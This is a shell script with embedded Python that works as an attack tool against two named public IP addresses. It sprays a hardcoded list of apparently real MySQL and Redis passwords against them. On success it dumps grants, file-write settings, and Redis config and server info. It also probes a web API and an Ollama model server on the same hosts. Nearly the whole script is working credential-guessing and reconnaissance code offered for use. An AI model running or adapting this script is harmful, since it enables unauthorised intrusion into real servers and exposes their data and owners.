#!/bin/bash
set +e
echo "### START $(date -u +%FT%TZ)"
pip install -q pymysql 2>/dev/null || pip3 install -q pymysql 2>/dev/null
python3 - <<'PY'
import pymysql
creds=[("root","Admin@123_para#!2024"),("root","Beijingcs.2024"),("root","Bingxing.2026"),("root","Kgzs@2024"),("root","ubuntu@"),("root","root"),("root",""),("kgzs","Kgzs@2024"),("ubuntu","ubuntu@")]
for host in ("123.184.7.135","123.184.7.152"):
    for u,p in creds:
        try:
            c=pymysql.connect(host=host,user=u,password=p,connect_timeout=6,read_timeout=8)
            cur=c.cursor(); cur.execute("select user(),@@version,@@secure_file_priv,current_user()")
            print("MYSQL HIT",host,u,p,"=>",cur.fetchone())
            try:
                cur.execute("show grants"); print("GRANTS",cur.fetchall())
            except Exception as e: print("GRANTS-ERR",e)
            c.close()
        except Exception as e:
            print("MYSQL",host,u,p,"ERR",str(e)[:90])
PY
echo "### 18080-API"
for u in / /api/health /api/datasets /api/jobs /api/submissions /api/status /openapi.json /docs /api /static/ /api/queue; do
  echo "-- $u"; timeout 10 curl -s -m 8 -o /tmp/o -w "code=%{http_code} len=%{size_download} ct=%{content_type}\n" "http://123.184.7.135:18080$u"; head -c 300 /tmp/o; echo
done
echo "### OLLAMA"
timeout 10 curl -s -m 8 http://123.184.7.135:11434/api/tags -w "|%{http_code}\n" | head -c 400
echo
echo "### REDIS-VENDOR"
python3 - <<'PY'
import socket,time
def rcmd(s,*a):
    q=b"*%d\r\n"%len(a)+b"".join(b"$%d\r\n%s\r\n"%(len(x),x) for x in [y.encode() if isinstance(y,str) else y for y in a])
    s.sendall(q); time.sleep(0.25)
    try: return s.recv(65535)
    except Exception as e: return b"ERR"
for host in ("123.184.7.135","123.184.7.152"):
    for pw in ["Beijingcs.2024","Kgzs@2024","Admin@123_para#!2024","ubuntu@","Bingxing.2026"]:
        try:
            s=socket.create_connection((host,6379),5); s.settimeout(4)
            r=rcmd(s,"AUTH",pw); print(host,"AUTH",pw,"=>",r[:40])
            if b"+OK" in r:
                print("DIR",rcmd(s,"CONFIG","GET","dir")[:120]); print("INFO",rcmd(s,"INFO","server")[:300]); print("ROLE",rcmd(s,"ROLE")[:100]); s.close(); break
            s.close()
        except Exception as e: print(host,"ERR",str(e)[:40])
PY
echo "### END $(date -u +%FT%TZ)"
